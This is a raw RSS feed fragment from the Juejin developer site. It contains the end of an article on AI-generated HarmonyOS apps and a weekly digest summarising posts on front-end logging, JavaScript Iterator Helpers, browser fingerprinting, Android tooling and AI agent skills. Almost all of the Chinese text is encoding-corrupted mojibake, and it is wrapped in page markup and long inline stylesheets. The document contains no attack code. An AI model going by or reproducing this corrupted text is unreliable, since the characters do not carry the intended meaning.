<p>å¯ä»¥çœ‹åˆ°ï¼Œ<strong>UI æ•ˆæœæ•´ä½“è¿˜æ˜¯ä¸é”™çš„</strong>ï¼ŒåŠŸèƒ½æ˜¯è¿˜å­˜åœ¨éœ€è¦ä»”ç»†è°ƒæ•´çš„éƒ¨åˆ†ã€‚</p>
<p>ä½†æ˜¯è¿™ä¸ªå¯æ˜¯ç”Ÿæˆ<strong>HarmonyOS é¸¿è’™åº”ç”¨</strong>å‘€ï¼Œ</p>
<p>ä¸æ˜¯ä¼ ç»Ÿçš„å®‰å“å’Œ iOSï¼Œå¾ˆå¤šAIç¼–è¾‘å™¨åšé¸¿è’™å¼€å‘è¿˜å¤„åœ¨è¯­æ³•éƒ½ä¸è¿‡å…³çš„æ—¶ä»£ï¼</p>
<hr/>
<p>å‚è€ƒé“¾æ¥ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.kimi.com%2Fblog%2Fkimi-k2-5.html" target="_blank" title="https://www.kimi.com/blog/kimi-k2-5.html" ref="nofollow noopener noreferrer">www.kimi.com/blog/kimi-kâ€¦</a></p>
<h3 data-id="heading-6">å…³æ³¨æˆ‘</h3>
<p><strong>å…³æ³¨æˆ‘</strong>ï¼ŒæŒç»­åˆ†äº«é¸¿è’™å¼€å‘ + AI ææ•ˆçš„å®æˆ˜æŠ€å·§ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ–­ç½‘ã€å¼±ç½‘ã€å…³é¡µéƒ½ä¸æ€•ï¼šå‰ç«¯æ—¥å¿—ä¸ŠæŠ¥æ€ä¹ˆåšåˆ°ä¸ä¸¢åŒ… | æ˜é‡‘ä¸€å‘¨ 1.29]]></title>    <link>https://juejin.cn/post/7600345782173466658</link>    <guid>https://juejin.cn/post/7600345782173466658</guid>    <pubDate>2026-01-29T06:43:08.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600345782173466658" data-draft-id="7600326947505946676" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ–­ç½‘ã€å¼±ç½‘ã€å…³é¡µéƒ½ä¸æ€•ï¼šå‰ç«¯æ—¥å¿—ä¸ŠæŠ¥æ€ä¹ˆåšåˆ°ä¸ä¸¢åŒ… | æ˜é‡‘ä¸€å‘¨ 1.29"/> <meta itemprop="keywords" content="å‰ç«¯,åç«¯,äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2026-01-29T06:43:08.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ˜é‡‘ä¸€å‘¨"/> <meta itemprop="url" content="https://juejin.cn/user/53218623894222"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ–­ç½‘ã€å¼±ç½‘ã€å…³é¡µéƒ½ä¸æ€•ï¼šå‰ç«¯æ—¥å¿—ä¸ŠæŠ¥æ€ä¹ˆåšåˆ°ä¸ä¸¢åŒ… | æ˜é‡‘ä¸€å‘¨ 1.29
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/53218623894222/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ˜é‡‘ä¸€å‘¨
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-29T06:43:08.000Z" title="Thu Jan 29 2026 06:43:08 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><em>æœ¬æ–‡å­—æ•°1600+ ï¼Œé˜…è¯»æ—¶é—´å¤§çº¦éœ€è¦ 5åˆ†é’Ÿã€‚</em></p>
<blockquote>
<p>ã€æ˜é‡‘ä¸€å‘¨ã€‘æœ¬æœŸäº®ç‚¹ï¼š</p>
</blockquote>
<ul>
<li>
<p><a href="https://juejin.cn/post/7596247009815412762" target="_blank" title="https://juejin.cn/post/7596247009815412762">æ–­ç½‘ã€å¼±ç½‘ã€å…³é¡µéƒ½ä¸æ€•ï¼šå‰ç«¯æ—¥å¿—ä¸ŠæŠ¥æ€ä¹ˆåšåˆ°ä¸ä¸¢åŒ…</a></p>
</li>
<li>
<p><a href="https://juejin.cn/post/7596932640727056419" target="_blank" title="https://juejin.cn/post/7596932640727056419">AIè¾…åŠ©ç ”å‘çš„è½åœ°å®è·µï¼šå·¥å…·ã€æ•ˆç‡ä¸æˆé•¿</a></p>
</li>
<li>
<p><a href="https://juejin.cn/post/7596926832912498751" target="_blank" title="https://juejin.cn/post/7596926832912498751">è¿˜åœ¨æ— è„‘ .map().filter()ï¼Ÿå®æµ‹æ”¹ç”¨ Iterator Helpers åï¼Œå†…å­˜å ç”¨é™ä½äº† 99%</a></p>
</li>
<li>
<p><a href="https://juejin.cn/post/7597278451030294538" target="_blank" title="https://juejin.cn/post/7597278451030294538">ä¸€ä¸ªæœˆæå®š100+è¡¨è¿ç§»ï¼šæˆ‘çš„â€œå·å¸ˆâ€Navicatå®æˆ˜å¤ç›˜</a></p>
</li>
<li>
<p><a href="https://juejin.cn/post/7596245612558319625" target="_blank" title="https://juejin.cn/post/7596245612558319625">Flutter åˆè¿å¤§å‘ä¿®æ”¹ï¼ŸiOS 26 é”®ç›˜å˜åŒ–å¯èƒ½å¸¦æ¥å¤§é‡åº•å±‚æ”¹åŠ¨</a></p>
</li>
<li>
<p><a href="https://juejin.cn/post/7598390354292621358" target="_blank" title="https://juejin.cn/post/7598390354292621358">Jetpack Composeé‡ç»„ç¨³å®šæ€§åˆ†æå™¨</a></p>
</li>
<li>
<p><a href="https://juejin.cn/post/7597776334065516596" target="_blank" title="https://juejin.cn/post/7597776334065516596">Agent Skillsåœ¨è´§æ‹‰æ‹‰AIåº”ç”¨å°è¯•</a></p>
</li>
<li>
<p><a href="https://juejin.cn/post/7596478936387108906" target="_blank" title="https://juejin.cn/post/7596478936387108906">ä»0å¼€å‘å¤§æ¨¡å‹ä¹‹å®ç°Agentï¼ˆBash åˆ° SKILLï¼‰</a></p>
</li>
</ul>
<blockquote>
<p><strong>ã€Œä¸Šæ¦œè§„åˆ™ã€</strong>ï¼šæ–‡ç« å‘å¸ƒæ—¶é—´åœ¨æœ¬æœŸã€Œæ˜é‡‘ä¸€å‘¨ã€å‘å¸ƒæ—¶é—´çš„å‰ä¸€å‘¨å†…ï¼›ä¸”ç¬¦åˆå„ä¸ªæ ç›®çš„å†…å®¹å®šä½å’Œè¦æ±‚ã€‚ å¦‚å‘ç°æ–‡ç« æœ‰æŠ„è¢­ã€æ´—ç¨¿ç­‰è¿åç¤¾åŒºè§„åˆ™çš„è¡Œä¸ºï¼Œå°†å–æ¶ˆå½“æœŸåŠåç»­ä¸Šæ¦œèµ„æ ¼ã€‚</p>
</blockquote>
<h2 data-id="heading-0">ä¸€å‘¨â€œé‡‘â€é€‰</h2>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/73d5bf990a124e3a87cffb06443ad9ca~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5o6Y6YeR5LiA5ZGo:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770273787&amp;x-signature=1xpz0ksz%2BLPwxKfHLV%2BRgtwKPjE%3D" alt="æ˜é‡‘ä¸€å‘¨ æ–‡ç« å¤´å›¾ 1303x734.jpg" loading="lazy"/></p>
<p><em>å†…å®¹è¯„å®¡ä»¬ä¼šåœ¨è¿‡å»çš„ä¸€å‘¨å†…å¯¹ç¤¾åŒºæ·±åº¦æŠ€æœ¯å¥½æ–‡è¿›è¡ŒæŒ–æ˜å’Œç­›é€‰ï¼Œä¼˜è´¨çš„æŠ€æœ¯æ–‡ç« æœ‰æœºä¼šå‡ºç°åœ¨ä¸‹æ–¹æ¦œå•ä¸­ï¼Œæ’åä¸åˆ†å…ˆåã€‚</em></p>
<h3 data-id="heading-1">å‰ç«¯</h3>
<p><a href="https://juejin.cn/post/7596247009815412762" target="_blank" title="https://juejin.cn/post/7596247009815412762">æ–­ç½‘ã€å¼±ç½‘ã€å…³é¡µéƒ½ä¸æ€•ï¼šå‰ç«¯æ—¥å¿—ä¸ŠæŠ¥æ€ä¹ˆåšåˆ°ä¸ä¸¢åŒ…</a> <a href="https://juejin.cn/user/3035079961218551/posts" target="_blank" title="https://juejin.cn/user/3035079961218551/posts">@ä¸ä¸€æ ·çš„å°‘å¹´_</a></p>
<blockquote>
<p>æˆ‘ä»¬ç”¨ä¸€ä¸ªæ•°ç»„ï¼ˆ<code>queue</code>ï¼‰æ¥æš‚å­˜æ—¥å¿—ï¼Œç„¶åé€šè¿‡Â  <strong>â€œé‡å¤Ÿäº†â€ã€â€œæ—¶é—´åˆ°äº†â€æˆ–â€œé¡µé¢è¦å…³äº†â€</strong> Â è¿™ä¸‰ä¸ªæ—¶æœºæ¥è§¦å‘å‘é€ï¼Œç¡®ä¿æ—¢ä¸ç§¯å‹ä¹Ÿä¸é¢‘ç¹æ‰“æ‰°æœåŠ¡å™¨ã€‚</p>
</blockquote>
<p><a href="https://juejin.cn/post/7596932640727056419" target="_blank" title="https://juejin.cn/post/7596932640727056419">AIè¾…åŠ©ç ”å‘çš„è½åœ°å®è·µï¼šå·¥å…·ã€æ•ˆç‡ä¸æˆé•¿</a> <a href="https://juejin.cn/user/3456520257288974/posts" target="_blank" title="https://juejin.cn/user/3456520257288974/posts">@æ”¿é‡‡äº‘æŠ€æœ¯</a></p>
<blockquote>
<p>ä»æ•´ä½“æ¥çœ‹ï¼ŒAIÂ è¾…åŠ©ç ”å‘å¹¶ä¸æ˜¯ç®€å•çš„â€œç”¨Â AIÂ å†™ä»£ç â€ï¼Œè€Œæ˜¯ä¸€ç§<strong>åˆ†å·¥æ˜ç¡®ã€è´£ä»»æ¸…æ™°çš„äººæœºåä½œæ¨¡å¼</strong>ï¼š   AIÂ æ“…é•¿å‘æ•£ã€æ•´ç†ã€ç”Ÿæˆï¼›äººç±»æ“…é•¿åˆ¤æ–­ã€å–èˆã€æ”¶æ•›ã€‚å½“äºŒè€…è¾¹ç•Œæ¸…æ™°ã€èŒè´£æ˜ç¡®æ—¶ï¼ŒAIÂ æ‰èƒ½çœŸæ­£æˆä¸ºç ”å‘æ•ˆç‡çš„æ”¾å¤§å™¨ï¼Œè€Œä¸æ˜¯æ–°çš„å¤æ‚åº¦æ¥æºã€‚</p>
</blockquote>
<p><a href="https://juejin.cn/post/7596926832912498751" target="_blank" title="https://juejin.cn/post/7596926832912498751">è¿˜åœ¨æ— è„‘ .map().filter()ï¼Ÿå®æµ‹æ”¹ç”¨ Iterator Helpers åï¼Œå†…å­˜å ç”¨é™ä½äº† 99%</a> <a href="https://juejin.cn/user/2175258804632332/posts" target="_blank" title="https://juejin.cn/user/2175258804632332/posts">@ä¹Ÿæ— é£é›¨ä¹Ÿé›¾æ™´</a></p>
<blockquote>
<p>Iterator Helpers æ˜¯ JavaScript æ–°åŠ çš„ç‰¹æ€§ï¼Œæä¾›äº†ä¸€å¥—"æƒ°æ€§æ±‚å€¼"ï¼ˆlazy evaluationï¼‰çš„æ–¹æ³•ã€‚å…³é”®åŒºåˆ«æ˜¯ï¼š<strong>ä¼ ç»Ÿæ•°ç»„æ–¹æ³•</strong>ï¼Œæ¯ä¸€æ­¥éƒ½ç«‹å³æ‰§è¡Œï¼Œåˆ›å»ºä¸­é—´æ•°ç»„ï¼›<strong>Iterator Helpers</strong>ï¼Œåªæè¿°è¦åšä»€ä¹ˆï¼ŒçœŸæ­£éœ€è¦æ•°æ®æ—¶æ‰æ‰§è¡Œã€‚</p>
</blockquote>
<p><a href="https://juejin.cn/post/7596970073750552612" target="_blank" title="https://juejin.cn/post/7596970073750552612">å‰ç«¯æŒ‡çº¹æŠ€æœ¯æ˜¯å¦‚ä½•å®ç°çš„ï¼Ÿï¼ˆCanvasã€Audioã€ç¡¬ä»¶API æ ¸å¿ƒåŸç†è§£å¯†ï¼‰</a> <a href="https://juejin.cn/user/3878732754331096/posts" target="_blank" title="https://juejin.cn/user/3878732754331096/posts">@ErpanOmer</a></p>
<blockquote>
<p>æ‰€è°“çš„å‰ç«¯æŒ‡çº¹æŠ€æœ¯ï¼Œæœ¬è´¨ä¸Šå°±æ˜¯<strong>æ‰¾ä¸åŒ</strong>çš„ä¸€ç§æ–¹å¼ã€‚å¼€å‘è€…åˆ©ç”¨ä¸€åˆ‡å¯ä»¥è°ƒç”¨çš„ APIï¼ˆCanvas, Audio, WebGL, ç¡¬ä»¶ä¿¡æ¯ï¼‰ï¼Œå¼ºè¿«æµè§ˆå™¨è¿›è¡ŒæŸç§å¤æ‚çš„è¿ç®—ã€‚ç”±äºç¡¬ä»¶å’Œé©±åŠ¨çš„ç»†å¾®å·®åˆ«ï¼Œè¿ç®—ç»“æœå¿…ç„¶å­˜åœ¨å·®å¼‚ã€‚è¿™äº›å·®å¼‚è¢«æ”¶é›†èµ·æ¥ï¼Œç”Ÿæˆäº†ä¸€ä¸ªå­—ç¬¦ä¸²ã€‚</p>
</blockquote>
<p><a href="https://juejin.cn/post/7597314244269228086" target="_blank" title="https://juejin.cn/post/7597314244269228086">ä»ç—›ç‚¹åˆ°æ¶æ„ï¼šç”¨ Chrome DevTools Panel åšåŸ‹ç‚¹æ ¡éªŒï¼Œæˆ‘æ˜¯æ€ä¹ˆè½åœ°çš„</a> <a href="https://juejin.cn/user/606586148237431/posts" target="_blank" title="https://juejin.cn/user/606586148237431/posts">@è½¬è½¬æŠ€æœ¯å›¢é˜Ÿ</a></p>
<blockquote>
<p>Chrome MV3 æ˜¯ä¸€å µå¢™ï¼Œä½†æŠ€æœ¯ä¸ä»…èƒ½ç Œå¢™ï¼Œä¹Ÿèƒ½æ¶æ¡¥ã€‚ é€šè¿‡å¯¹åº•å±‚åŸç†çš„æ·±å…¥æŒ–æ˜ï¼Œæˆ‘ä»¬è¯æ˜äº†å³ä½¿åœ¨æœ€ä¸¥æ ¼çš„å®‰å…¨é™åˆ¶ä¸‹ï¼Œä¾ç„¶å¯ä»¥æ‰“é€ å‡ºæè‡´çš„å¼€å‘è€…å·¥å…·ã€‚ å¸Œæœ›æœ¬æ–‡èƒ½ç»™ä½ å¸¦æ¥ä¸¤æ–¹é¢çš„æ”¶è·ï¼šä¸€æ˜¯å…³äº Chrome æ’ä»¶å¼€å‘çš„ç¡¬æ ¸çŸ¥è¯†ï¼ŒäºŒæ˜¯ä¸€ç§â€œä¸å‡‘åˆã€ä¸å¦¥åâ€çš„æå®¢ç²¾ç¥ã€‚</p>
</blockquote>
<h3 data-id="heading-2">åç«¯</h3>
<p><a href="https://juejin.cn/post/7597278451030294538" target="_blank" title="https://juejin.cn/post/7597278451030294538">ä¸€ä¸ªæœˆæå®š100+è¡¨è¿ç§»ï¼šæˆ‘çš„â€œå·å¸ˆâ€Navicatå®æˆ˜å¤ç›˜</a> <a href="https://juejin.cn/user/3485898277388519/posts" target="_blank" title="https://juejin.cn/user/3485898277388519/posts">@ä¸€æ—…äºº</a></p>
<blockquote>
<p>100+å¼ è¡¨ï¼Œæ¯å¼ è¡¨çš„å­—æ®µã€ç±»å‹ã€ä¸»é”®éƒ½ä¸ä¸€æ ·ã€‚ä¼ ç»ŸMyBatisæ–¹å¼æ„å‘³ç€è¦å†™100+ä¸ªMapperã€100+ä¸ªå®ä½“ç±»ã€‚åç»­æ–°å¢è¡¨è¿˜å¾—ç»§ç»­å†™ï¼Œ<strong>ä»£ç å¤ç”¨åº¦â‰ˆ0</strong>ã€‚</p>
</blockquote>
<h3 data-id="heading-3">Android</h3>
<p><a href="https://juejin.cn/post/7596245612558319625" target="_blank" title="https://juejin.cn/post/7596245612558319625">Flutter åˆè¿å¤§å‘ä¿®æ”¹ï¼ŸiOS 26 é”®ç›˜å˜åŒ–å¯èƒ½å¸¦æ¥å¤§é‡åº•å±‚æ”¹åŠ¨</a> <a href="https://juejin.cn/user/817692379985752/posts" target="_blank" title="https://juejin.cn/user/817692379985752/posts">@æ‹çŒ«deå°éƒ­</a></p>
<blockquote>
<p>è™½ç„¶é—®é¢˜çœ‹èµ·æ¥æ˜¯ä¸€ä¸ªåœ†è§’é—®é¢˜ï¼Œä½†æ˜¯å®é™…ä¸Šè¿™æ˜¯Â <strong>iOS 26 ç³»ç»Ÿé”®ç›˜å¢åŠ äº†â€œåŠé€æ˜â€åå¸¦æ¥çš„é—®é¢˜ï¼ŒFlutter åœ¨é”®ç›˜åé¢é‚£ä¸€å±‚åœ¨æŸäº›åœºæ™¯ä¸‹æ²¡æœ‰æ­£ç¡®æ¸²æŸ“å†…å®¹</strong>ï¼Œå¯¼è‡´é”®ç›˜åŠé€æ˜åŒºåŸŸé€å‡ºæ¥çš„ä¸æ˜¯åº•ä¸‹ BottomSheet çš„çœŸå®å†…å®¹ï¼Œè€Œæ˜¯ä¸€æ•´å—é»‘è‰²åŒºåŸŸã€‚</p>
</blockquote>
<p><a href="https://juejin.cn/post/7597900782910685203" target="_blank" title="https://juejin.cn/post/7597900782910685203">Android Gradle Plugin 9.0 å‘å¸ƒï¼Œä¸ºä»€ä¹ˆè¿™ä¼šæ˜¯ä¸ªå²è¯—çº§å¤§å‘ç‰ˆæœ¬</a> <a href="https://juejin.cn/user/817692379985752/posts" target="_blank" title="https://juejin.cn/user/817692379985752/posts">@æ‹çŒ«deå°éƒ­</a></p>
<blockquote>
<p>AGP 9.0 å¼€å§‹<strong>åªæš´éœ²æ–°çš„ public DSL interfaces</strong>ï¼Œæ—§çš„ DSL ç±»å‹ï¼ˆæ¯”å¦‚å†å²ä¸Šå¾ˆå¤šæ’ä»¶/è„šæœ¬ä¼šå¼ºè½¬åˆ° <code>BaseExtension</code> ä¹‹ç±»ï¼‰ä¸å†æä¾›ï¼Œå¹¶ä¸”<strong>æ—§çš„ variant APIï¼ˆ<code>applicationVariants</code> ç­‰ï¼‰ä¹Ÿä¸€èµ·è¢«åˆ‡æ–­</strong>ï¼Œè¦è¿ç§»åˆ° <code>androidComponents</code> APIã€‚</p>
</blockquote>
<p><a href="https://juejin.cn/post/7598390354292621358" target="_blank" title="https://juejin.cn/post/7598390354292621358">Jetpack Composeé‡ç»„ç¨³å®šæ€§åˆ†æå™¨</a> <a href="https://juejin.cn/user/2788017216685784/posts" target="_blank" title="https://juejin.cn/user/2788017216685784/posts">@ç¨€æœ‰çŒ¿è¯‰</a></p>
<blockquote>
<p>æœ¬æ–‡å°†æ¢è®¨ Compose ç¨³å®šæ€§åˆ†æå™¨çš„å·¥ä½œåŸç†ï¼ŒåŒ…æ‹¬ï¼šIntelliJ æ’ä»¶ï¼ˆä¸ºä½ çš„ IDE æä¾›å¯è§†åŒ–çš„ç¨³å®šæ€§æŒ‡ç¤ºå™¨ï¼‰ã€ç¼–è¯‘å™¨æ’ä»¶ï¼ˆå¯ç”¨è¿è¡Œæ—¶é‡ç»„è·Ÿè¸ªï¼‰ä»¥åŠç¨³å®šæ€§éªŒè¯ç³»ç»Ÿï¼ˆé˜²æ­¢å›å½’é—®é¢˜å½±å“ç”Ÿäº§ç¯å¢ƒï¼‰ã€‚</p>
</blockquote>
<h3 data-id="heading-4">äººå·¥æ™ºèƒ½</h3>
<p><a href="https://juejin.cn/post/7597776334065516596" target="_blank" title="https://juejin.cn/post/7597776334065516596">Agent Skillsåœ¨è´§æ‹‰æ‹‰AIåº”ç”¨å°è¯•</a> <a href="https://juejin.cn/user/1768489241815070/posts" target="_blank" title="https://juejin.cn/user/1768489241815070/posts">@è´§æ‹‰æ‹‰æŠ€æœ¯</a></p>
<blockquote>
<p><strong>æ¸è¿›å¼æŠ«éœ²</strong>æ˜¯AgentæŠ€èƒ½è®¾è®¡ä¸­çš„æ ¸å¿ƒåŸåˆ™ï¼Œå®ƒè®©æ™ºèƒ½ä½“çš„æŠ€èƒ½ä½“ç³»æ—¢<strong>çµæ´»åˆå¯æ‰©å±•</strong>ã€‚å°±åƒä¸€æœ¬ç»“æ„æ¸…æ™°çš„è¯´æ˜ä¹¦ï¼Œå…ˆç»™ç›®å½•ï¼Œå†åˆ†ç« èŠ‚ï¼Œæœ€åé™„ä¸Šè¯¦ç»†é™„å½•â€”â€”æŠ€èƒ½çš„è®¾è®¡ä¹Ÿæ˜¯å¦‚æ­¤ï¼Œè®©Claude<strong>åªåœ¨éœ€è¦æ—¶</strong>æ‰åŠ è½½å¯¹åº”çš„ä¿¡æ¯ã€‚</p>
</blockquote>
<p><a href="https://juejin.cn/post/7596478936387108906" target="_blank" title="https://juejin.cn/post/7596478936387108906">ä»0å¼€å‘å¤§æ¨¡å‹ä¹‹å®ç°Agentï¼ˆBash åˆ° SKILLï¼‰</a> <a href="https://juejin.cn/user/3245414056989757/posts" target="_blank" title="https://juejin.cn/user/3245414056989757/posts">@å‘¨æœ«ç¨‹åºçŒ¿</a></p>
<blockquote>
<p>æ¨¡å‹ã€å·¥å…·ã€æŒ‡ä»¤ä¸‰è€…æ„æˆäº†Â <code>AI Agent</code>Â çš„ä¸‹é™å’Œä¸Šé™ï¼Œæ¨¡å‹è¶Šå¼ºï¼Œå¯¹äºæŒ‡ä»¤å’Œå·¥å…·çš„è°ƒåº¦èƒ½åŠ›æ›´å‡†ç¡®ï¼Œä½†æ˜¯ä»å·¥ç¨‹å­¦çš„è§’åº¦æ¥è€ƒè™‘ï¼Œè¾ƒå¼±çš„æ¨¡å‹é€šè¿‡å¯¹å·¥å…·å’ŒæŒ‡ä»¤çš„ç»“åˆï¼Œä¸€æ ·èƒ½åˆ¶é€ åŠŸèƒ½å¼ºå¤§çš„Â <code>Agent</code>ã€‚</p>
</blockquote>
<p><a href="https://juejin.cn/post/7596926832913055807" target="_blank" title="https://juejin.cn/post/7596926832913055807">2026 æœ€æ–° Claude Skills ä¿å§†çº§æ•™ç¨‹åŠå®è·µï¼</a> <a href="https://juejin.cn/user/588993963763405/posts" target="_blank" title="https://juejin.cn/user/588993963763405/posts">@è‹ä½•</a></p>
<blockquote>
<p>Skills æ”¹å˜äº†æˆ‘ä»¬ä¸ AI åä½œçš„åŸºæœ¬æ–¹å¼ã€‚å®ƒä»¬å°†ä¸€æ¬¡æ€§çš„æç¤ºï¼Œè½¬å˜ä¸ºæŒä¹…ã€å¯ç»„åˆçš„çŸ¥è¯†èµ„äº§ã€‚é€šè¿‡ä¸º AI å»ºç«‹ä¸€ä¸ªå¯æ‰©å±•çš„ç¨‹åºæ€§è®°å¿†åº“ï¼ŒSkills æ­£åœ¨ä¸ºä¸‹ä¸€ä»£ä»£æ›´å¼ºå¤§ã€æ›´è‡ªä¸»ã€æ›´èƒ½ä¸äººç±»ä¸“å®¶æ— ç¼åä½œçš„ AI Agent å¥ å®šåŸºç¡€ã€‚</p>
</blockquote>
<h2 data-id="heading-5">ğŸ“– æŠ•ç¨¿ä¸“åŒº</h2>
<blockquote>
<p>å¤§å®¶å¯ä»¥åœ¨è¯„è®ºåŒºæ¨èè®¤ä¸ºä¸é”™çš„æ–‡ç« ï¼Œå¹¶é™„ä¸Šé“¾æ¥å’Œæ¨èç†ç”±ï¼Œæœ‰æœºä¼šå‘ˆç°åœ¨ä¸‹ä¸€æœŸã€‚æ–‡ç« åˆ›å»ºæ—¥æœŸå¿…é¡»åœ¨ä¸‹æœŸæ˜é‡‘ä¸€å‘¨å‘å¸ƒå‰ä¸€å‘¨ä»¥å†…ï¼›å¯ä»¥æ¨èè‡ªå·±çš„æ–‡ç« ã€ä¹Ÿå¯ä»¥æ¨èä»–äººçš„æ–‡ç« ã€‚</p>
